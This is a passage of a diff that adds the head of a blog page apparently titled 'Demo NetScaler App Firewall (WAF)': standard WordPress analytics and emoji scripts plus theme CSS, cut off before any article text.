@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<title>Demo NetScaler App Firewall (WAF) &#8211; SeriousTek</title>
+<meta name='robots' content='max-image-preview:large' />
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	<meta name="viewport" content="width=device-width, initial-scale=1"><link rel="amphtml" href="https://blogs.serioustek.net/post/2016/03/22/demo-netscaler-app-firewall/amp" /><meta name="generator" content="AMP for WP 1.1.4"/><link rel='dns-prefetch' href='//secure.gravatar.com' />
+<link rel='dns-prefetch' href='//stats.wp.com' />
+<link rel='dns-prefetch' href='//v0.wordpress.com' />
+<link rel='dns-prefetch' href='//jetpack.wordpress.com' />
+<link rel='dns-prefetch' href='//s0.wp.com' />
+<link rel='dns-prefetch' href='//public-api.wordpress.com' />
+<link rel='dns-prefetch' href='//0.gravatar.com' />
+<link rel='dns-prefetch' href='//1.gravatar.com' />
+<link rel='dns-prefetch' href='//2.gravatar.com' />
+<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
+<link href='https://fonts.googleapis.com' crossorigin rel='preconnect' />
+<link rel="alternate" type="application/rss+xml" title="SeriousTek &raquo; Feed" href="https://blogs.serioustek.net/feed" />
+<link rel="alternate" type="application/rss+xml" title="SeriousTek &raquo; Comments Feed" href="https://blogs.serioustek.net/comments/feed" />
+<link rel="alternate" type="application/rss+xml" title="SeriousTek &raquo; Demo NetScaler App Firewall (WAF) Comments Feed" href="https://blogs.serioustek.net/post/2016/03/22/demo-netscaler-app-firewall/feed" />
+		<!-- This site uses the Google Analytics by ExactMetrics plugin v8.4.1 - Using Analytics tracking - https://www.exactmetrics.com/ -->
+							<script src="//www.googletagmanager.com/gtag/js?id=G-3RQX76N9PK"  data-cfasync="false" data-wpfc-render="false" async></script>
+			<script data-cfasync="false" data-wpfc-render="false">
+				var em_version = '8.4.1';
+				var em_track_user = true;
+				var em_no_track_reason = '';
+								var ExactMetricsDefaultLocations = {"page_location":"https:\/\/blogs.serioustek.net\/post\/2016\/03\/22\/demo-netscaler-app-firewall\/"};
+				if ( typeof ExactMetricsPrivacyGuardFilter === 'function' ) {
+					var ExactMetricsLocations = (typeof ExactMetricsExcludeQuery === 'object') ? ExactMetricsPrivacyGuardFilter( ExactMetricsExcludeQuery ) : ExactMetricsPrivacyGuardFilter( ExactMetricsDefaultLocations );
+				} else {
+					var ExactMetricsLocations = (typeof ExactMetricsExcludeQuery === 'object') ? ExactMetricsExcludeQuery : ExactMetricsDefaultLocations;
+				}
+
+								var disableStrs = [
+										'ga-disable-G-3RQX76N9PK',
+									];
+
+				/* Function to detect opted out users */
+				function __gtagTrackerIsOptedOut() {
+					for (var index = 0; index < disableStrs.length; index++) {
+						if (document.cookie.indexOf(disableStrs[index] + '=true') > -1) {
+							return true;
+						}
+					}
+
+					return false;
+				}
+
+				/* Disable tracking if the opt-out cookie exists. */
+				if (__gtagTrackerIsOptedOut()) {
+					for (var index = 0; index < disableStrs.length; index++) {
+						window[disableStrs[index]] = true;
+					}
+				}
+
+				/* Opt-out function */
+				function __gtagTrackerOptout() {
+					for (var index = 0; index < disableStrs.length; index++) {
+						document.cookie = disableStrs[index] + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
+						window[disableStrs[index]] = true;
+					}
+				}
+
+				if ('undefined' === typeof gaOptout) {
+					function gaOptout() {
+						__gtagTrackerOptout();
+					}
+				}
+								window.dataLayer = window.dataLayer || [];
+
+				window.ExactMetricsDualTracker = {
+					helpers: {},
+					trackers: {},
+				};
+				if (em_track_user) {
+					function __gtagDataLayer() {
+						dataLayer.push(arguments);
+					}
+
+					function __gtagTracker(type, name, parameters) {
+						if (!parameters) {
+							parameters = {};
+						}
+
+						if (parameters.send_to) {
+							__gtagDataLayer.apply(null, arguments);
+							return;
+						}
+
+						if (type === 'event') {
+														parameters.send_to = exactmetrics_frontend.v4_id;
+							var hookName = name;
+							if (typeof parameters['event_category'] !== 'undefined') {
+								hookName = parameters['event_category'] + ':' + name;
+							}
+
+							if (typeof ExactMetricsDualTracker.trackers[hookName] !== 'undefined') {
+								ExactMetricsDualTracker.trackers[hookName](parameters);
+							} else {
+								__gtagDataLayer('event', name, parameters);
+							}
+							
+						} else {
+							__gtagDataLayer.apply(null, arguments);
+						}
+					}
+
+					__gtagTracker('js', new Date());
+					__gtagTracker('set', {
+						'developer_id.dNDMyYj': true,
+											});
+					if ( ExactMetricsLocations.page_location ) {
+						__gtagTracker('set', ExactMetricsLocations);
+					}
+										__gtagTracker('config', 'G-3RQX76N9PK', {"forceSSL":"true"} );
+															window.gtag = __gtagTracker;										(function () {
+						/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
+						/* ga and __gaTracker compatibility shim. */
+						var noopfn = function () {
+							return null;
+						};
+						var newtracker = function () {
+							return new Tracker();
+						};
+						var Tracker = function () {
+							return null;
+						};
+						var p = Tracker.prototype;
+						p.get = noopfn;
+						p.set = noopfn;
+						p.send = function () {
+							var args = Array.prototype.slice.call(arguments);
+							args.unshift('send');
+							__gaTracker.apply(null, args);
+						};
+						var __gaTracker = function () {
+							var len = arguments.length;
+							if (len === 0) {
+								return;
+							}
+							var f = arguments[len - 1];
+							if (typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function') {
+								if ('send' === arguments[0]) {
+									var hitConverted, hitObject = false, action;
+									if ('event' === arguments[1]) {
+										if ('undefined' !== typeof arguments[3]) {
+											hitObject = {
+												'eventAction': arguments[3],
+												'eventCategory': arguments[2],
+												'eventLabel': arguments[4],
+												'value': arguments[5] ? arguments[5] : 1,
+											}
+										}
+									}
+									if ('pageview' === arguments[1]) {
+										if ('undefined' !== typeof arguments[2]) {
+											hitObject = {
+												'eventAction': 'page_view',
+												'page_path': arguments[2],
+											}
+										}
+									}
+									if (typeof arguments[2] === 'object') {
+										hitObject = arguments[2];
+									}
+									if (typeof arguments[5] === 'object') {
+										Object.assign(hitObject, arguments[5]);
+									}
+									if ('undefined' !== typeof arguments[1].hitType) {
+										hitObject = arguments[1];
+										if ('pageview' === hitObject.hitType) {
+											hitObject.eventAction = 'page_view';
+										}
+									}
+									if (hitObject) {
+										action = 'timing' === arguments[1].hitType ? 'timing_complete' : hitObject.eventAction;
+										hitConverted = mapArgs(hitObject);
+										__gtagTracker('event', action, hitConverted);
+									}
+								}
+								return;
+							}
+
+							function mapArgs(args) {
+								var arg, hit = {};
+								var gaMap = {
+									'eventCategory': 'event_category',
+									'eventAction': 'event_action',
+									'eventLabel': 'event_label',
+									'eventValue': 'event_value',
+									'nonInteraction': 'non_interaction',
+									'timingCategory': 'event_category',
+									'timingVar': 'name',
+									'timingValue': 'value',
+									'timingLabel': 'event_label',
+									'page': 'page_path',
+									'location': 'page_location',
+									'title': 'page_title',
+									'referrer' : 'page_referrer',
+								};
+								for (arg in args) {
+																		if (!(!args.hasOwnProperty(arg) || !gaMap.hasOwnProperty(arg))) {
+										hit[gaMap[arg]] = args[arg];
+									} else {
+										hit[arg] = args[arg];
+									}
+								}
+								return hit;
+							}
+
+							try {
+								f.hitCallback();
+							} catch (ex) {
+							}
+						};
+						__gaTracker.create = newtracker;
+						__gaTracker.getByName = newtracker;
+						__gaTracker.getAll = function () {
+							return [];
+						};
+						__gaTracker.remove = noopfn;
+						__gaTracker.loaded = true;
+						window['__gaTracker'] = __gaTracker;
+					})();
+									} else {
+										console.log("");
+					(function () {
+						function __gtagTracker() {
+							return null;
+						}
+
+						window['__gtagTracker'] = __gtagTracker;
+						window['gtag'] = __gtagTracker;
+					})();
+									}
+			</script>
+				<!-- / Google Analytics by ExactMetrics -->
+		<script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/blogs.serioustek.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.2"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+</script>
+<link rel='stylesheet' id='generate-fonts-css' href='//fonts.googleapis.com/css?family=Open+Sans:300,300italic,regular,italic,600,600italic,700,700italic,800,800italic' media='all' />
+<style id='wp-emoji-styles-inline-css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<link rel='stylesheet' id='wp-block-library-css' href='https://blogs.serioustek.net/wp-includes/css/dist/block-library/style.min.css?ver=6.7.2' media='all' />
+<link rel='stylesheet' id='mediaelement-css' href='https://blogs.serioustek.net/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.17' media='all' />
+<link rel='stylesheet' id='wp-mediaelement-css' href='https://blogs.serioustek.net/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=6.7.2' media='all' />
+<style id='jetpack-sharing-buttons-style-inline-css'>
+.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
+</style>
+<style id='classic-theme-styles-inline-css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id='global-styles-inline-css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--contrast: var(--contrast);--wp--preset--color--contrast-2: var(--contrast-2);--wp--preset--color--contrast-3: var(--contrast-3);--wp--preset--color--base: var(--base);--wp--preset--color--base-2: var(--base-2);--wp--preset--color--base-3: var(--base-3);--wp--preset--color--accent: var(--accent);--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='generate-secondary-nav-css' href='https://blogs.serioustek.net/wp-content/plugins/gp-premium/addons/generate-secondary-nav/inc/css/style.css?ver=6.7.2' media='all' />
+<link rel='stylesheet' id='generate-secondary-nav-mobile-css' href='https://blogs.serioustek.net/wp-content/plugins/gp-premium/addons/generate-secondary-nav/inc/css/mobile.css?ver=0.2' media='all' />
+<link rel='stylesheet' id='generate-style-grid-css' href='https://blogs.serioustek.net/wp-content/themes/generatepress/assets/css/unsemantic-grid.min.css?ver=3.3.1' media='all' />
+<link rel='stylesheet' id='generate-style-css' href='https://blogs.serioustek.net/wp-content/themes/generatepress/assets/css/style.min.css?ver=3.3.1' media='all' />
+<style id='generate-style-inline-css'>
+.inside-header {padding-top: 40px; padding-right: 40px; padding-bottom: 40px; padding-left: 40px; }.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .separate-containers .paging-navigation, .one-container .site-content {padding-top: 40px; padding-right: 40px; padding-bottom: 40px; padding-left: 40px; }.ignore-x-spacing {margin-right: -40px; margin-bottom: 40px; margin-left: -40px; }.ignore-xy-spacing {margin-top: -40px; margin-right: -40px; margin-bottom: 40px; margin-left: -40px; }.main-navigation .main-nav ul li a,			.menu-toggle {padding-left: 25px; padding-right: 25px; line-height: 50px; }.nav-float-right .main-navigation .main-nav ul li a {line-height: 50px; }.main-navigation .main-nav ul ul li a {padding-left: 25px; padding-right: 25px; padding-top: 10px; padding-bottom: 10px; }.main-navigation ul ul {top: 50px; }.navigation-search {height: 50px; line-height: 0px; }.navigation-search input {height: 50px; line-height: 0px; }.widget-area .widget {padding-top: 20px; padding-right: 20px; padding-bottom: 20px; padding-left: 20px; }.footer-widgets {padding-top: 40px; padding-right: 0px; padding-bottom: 40px; padding-left: 0px; }.site-info {padding-top: 20px; padding-right: 20px; padding-bottom: 20px; padding-left: 20px; }.right-sidebar.separate-containers .site-main {margin-top: 10px; margin-right: 10px; margin-bottom: 10px; margin-left: 0px; padding: 0px; }.left-sidebar.separate-containers .site-main {margin-top: 10px; margin-right: 0px; margin-bottom: 10px; margin-left: 10px; padding: 0px; }.both-sidebars.separate-containers .site-main {margin: 10px; padding: 0px; }.both-right.separate-containers .site-main {margin-top: 10px; margin-right: 10px; margin-bottom: 10px; margin-left: 0px; padding: 0px; }.separate-containers .site-main {margin-top: 10px; margin-bottom: 10px; padding: 0px; }.separate-containers .page-header-image, .separate-containers .page-header-content, .separate-containers .page-header-image-single, .separate-containers .page-header-content-single {margin-top: 10px; }.both-left.separate-containers .site-main {margin-top: 10px; margin-right: 0px; margin-bottom: 10px; margin-left: 10px; padding: 0px; }.separate-containers .inside-right-sidebar, .inside-left-sidebar {margin-top: 10px; margin-bottom: 10px; padding-top: 0px; padding-bottom: 0px; }.separate-containers .widget, .separate-containers .hentry, .separate-containers .page-header, .widget-area .main-navigation {margin-bottom: 10px; }.both-left.separate-containers .inside-left-sidebar {margin-right: 5px; padding-right: 0px; }.both-left.separate-containers .inside-right-sidebar {margin-left: 5px; padding-left: 0px; }.both-right.separate-containers .inside-left-sidebar {margin-right: 5px; padding-right: 0px; }.both-right.separate-containers .inside-right-sidebar {margin-left: 5px; padding-left: 0px; }
+body{background-color:#efefef;color:#3a3a3a;}a{color:#1e73be;}a:hover, a:focus, a:active{color:#000000;}body .grid-container{max-width:1400px;}.wp-block-group__inner-container{max-width:1400px;margin-left:auto;margin-right:auto;}:root{--contrast:#222222;--contrast-2:#575760;--contrast-3:#b2b2be;--base:#f0f0f0;--base-2:#f7f8f9;--base-3:#ffffff;--accent:#1e73be;}:root .has-contrast-color{color:var(--contrast);}:root .has-contrast-background-color{background-color:var(--contrast);}:root .has-contrast-2-color{color:var(--contrast-2);}:root .has-contrast-2-background-color{background-color:var(--contrast-2);}:root .has-contrast-3-color{color:var(--contrast-3);}:root .has-contrast-3-background-color{background-color:var(--contrast-3);}:root .has-base-color{color:var(--base);}:root .has-base-background-color{background-color:var(--base);}:root .has-base-2-color{color:var(--base-2);}:root .has-base-2-background-color{background-color:var(--base-2);}:root .has-base-3-color{color:var(--base-3);}:root .has-base-3-background-color{background-color:var(--base-3);}:root .has-accent-color{color:var(--accent);}:root .has-accent-background-color{background-color:var(--accent);}body, button, input, select, textarea{font-family:"Open Sans", sans-serif;}body{line-height:1.5;}.entry-content > [class*="wp-block-"]:not(:last-child):not(.wp-block-heading){margin-bottom:1.5em;}.main-title{font-size:45px;}.main-navigation .main-nav ul ul li a{font-size:14px;}.sidebar .widget, .footer-widgets .widget{font-size:17px;}h1{font-weight:300;font-size:40px;}h2{font-weight:300;font-size:30px;}h3{font-size:20px;}h4{font-size:inherit;}h5{font-size:inherit;}@media (max-width:768px){.main-title{font-size:30px;}h1{font-size:30px;}h2{font-size:25px;}}.top-bar{background-color:#636363;color:#ffffff;}.top-bar a{color:#ffffff;}.top-bar a:hover{color:#303030;}.site-header{background-color:#ffffff;color:#3a3a3a;}.site-header a{color:#3a3a3a;}.main-title a,.main-title a:hover{color:#222222;}.site-description{color:#757575;}.main-navigation,.main-navigation ul ul{background-color:#222222;}.main-navigation .main-nav ul li a, .main-navigation .menu-toggle, .main-navigation .menu-bar-items{color:#ffffff;}.main-navigation .main-nav ul li:not([class*="current-menu-"]):hover > a, .main-navigation .main-nav ul li:not([class*="current-menu-"]):focus > a, .main-navigation .main-nav ul li.sfHover:not([class*="current-menu-"]) > a, .main-navigation .menu-bar-item:hover > a, .main-navigation .menu-bar-item.sfHover > a{color:#ffffff;background-color:#3f3f3f;}button.menu-toggle:hover,button.menu-toggle:focus,.main-navigation .mobile-bar-items a,.main-navigation .mobile-bar-items a:hover,.main-navigation .mobile-bar-items a:focus{color:#ffffff;}.main-navigation .main-nav ul li[class*="current-menu-"] > a{color:#ffffff;background-color:#3f3f3f;}.navigation-search input[type="search"],.navigation-search input[type="search"]:active, .navigation-search input[type="search"]:focus, .main-navigation .main-nav ul li.search-item.active > a, .main-navigation .menu-bar-items .search-item.active > a{color:#ffffff;background-color:#3f3f3f;}.main-navigation ul ul{background-color:#3f3f3f;}.main-navigation .main-nav ul ul li a{color:#ffffff;}.main-navigation .main-nav ul ul li:not([class*="current-menu-"]):hover > a,.main-navigation .main-nav ul ul li:not([class*="current-menu-"]):focus > a, .main-navigation .main-nav ul ul li.sfHover:not([class*="current-menu-"]) > a{color:#ffffff;background-color:#4f4f4f;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a{color:#ffffff;background-color:#4f4f4f;}.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .one-container .container, .separate-containers .paging-navigation, .inside-page-header{background-color:#ffffff;}.entry-meta{color:#595959;}.entry-meta a{color:#595959;}.entry-meta a:hover{color:#1e73be;}.sidebar .widget{background-color:#ffffff;}.sidebar .widget .widget-title{color:#000000;}.footer-widgets{background-color:#ffffff;}.footer-widgets .widget-title{color:#000000;}.site-info{color:#ffffff;background-color:#222222;}.site-info a{color:#ffffff;}.site-info a:hover{color:#606060;}.footer-bar .widget_nav_menu .current-menu-item 